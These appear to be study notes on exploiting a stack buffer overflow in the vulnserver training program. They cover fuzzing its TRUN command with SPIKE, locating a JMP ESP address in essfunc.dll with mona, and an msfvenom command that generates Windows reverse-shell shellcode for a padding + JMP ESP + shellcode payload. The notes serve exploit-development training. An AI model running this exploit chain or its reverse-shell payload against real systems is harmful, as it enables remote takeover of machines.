# Buffer Over flow

EIP is a register in x86 architectures (32bit). 
- It holds the "Extended Instruction Pointer" for the stack. 
- It tells the computer where to go next to execute the next command and controls the flow of a program.
		
ESP (Extended Stack Pointer)

EBP (Extended Base Pointer)
		
		
Input data -> manipulate EIP -> Run JMP ESP -> data transfered to code.
- https://datacellsolutions.com/2020/09/23/exploiting-a-simple-stack-based-buffer-overflow-vulnerability/
		
	
```	# nc [ip] [port] ```
- connect to target.		
		
## Spike & Fuzzing
		
- https://resources.infosecinstitute.com/topic/intro-to-fuzzing/
- https://resources.infosecinstitute.com/topic/fuzzer-automation-with-spike/
- Fuzzing is a process of sending deliberately malformed data to a program in order to generate failures, or errors in the application. When performed by those in the software exploitation community, fuzzing usually focuses on discovery of bugs that can be exploited to allow an attacker to run their own code, and along with binary and source code analysis fuzzing is one of the primary ways in which exploitable software bugs are discovered.
- Technically speaking, SPIKE is actually a fuzzer creation kit, providing an API that allows a user to create their own fuzzers for network based protocols using the C programming language.
		
		
```	# pluma stats.spk ```
- "STATS" is a command of the vulnerable server.
			
``` # generic_send_tcp 10.10.10.10 9999 stats.spk 0 0 ```
- generic_send_tcp host port spike_script SKIPVAR SKIPSTR.
- generic_send_tcp: TCP SPIKE script interpreter.send the specified SPIKE at a particular IP address and TCP port.
- stats.spk is the spike_script, and 0 and 0 are the values of SKIPVAR and SKIPSTR, which essentially allow you to jump into the middle of the fuzzing session defined by a SPIKE script.
- if you include three “s_string_variables” in your SPIKE script, and you want to ignore the first two variables and only fuzz the third, you would set SKIPVAR to 2
- If you want to skip the first 10 of these strings, and start fuzzing at string 11, you can set SKIPSTR to 10.
		
``` # pluma trun.spk ```
- "TRUN" is a command of the vulnerable server.
			
```c			
s_readline(); // Reads a single line of input from the server
s_string("string"); // simply prints the string “string” as part of your “SPIKE”
s_string_variable("string"); // inserts a fuzzed string into your “SPIKE”. The string “string” will be used for the first iteration of this variable, as well as for any SPIKES where other s_string_variables are being iterated
```

## use mona.py in Immunity Debugger.
in mona software ``` !mona modules ```
- The essfunc.dll has no memory protection
- ASLR: Address space layout randomization.
	
### nasm_shell.rb
This script is used to convert assembly language into hex code.
- input: JMP ESP
- utput: FFE4
				
In debugger ``` !mona find -s “\xff\xe4” -m essfunc.dll ```
		
x86 is little endian, 
  - 0x625011af:	
  - need to encode it as \xaf\x11\x50\x62
	
generate shell code.
``` msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00" ```
	
shellcode.py
- Padding + JMP ESP + shellcode
- Now, the question here arises what is ‘JMP ESP’ and why do we use it. Putting it simply, ‘JMP ESP’ means ‘Jump to the ESP register.’ We will place our shellcode on top of our stack frame, for that reason we need the memory address of JMP ESP. We’ll inject this return address into the EIP, and as vulnserver starts its execution, after overflowing the buffer space, it’ll look into the EIP for the next instruction, where it will find the JMP ESP opcode, so it’ll jump back to the ESP, where it will find our shellcode, execute the code and give us command execution into the system.
- Input data -> manipulate EIP -> Run JMP ESP -> data transfered to code.
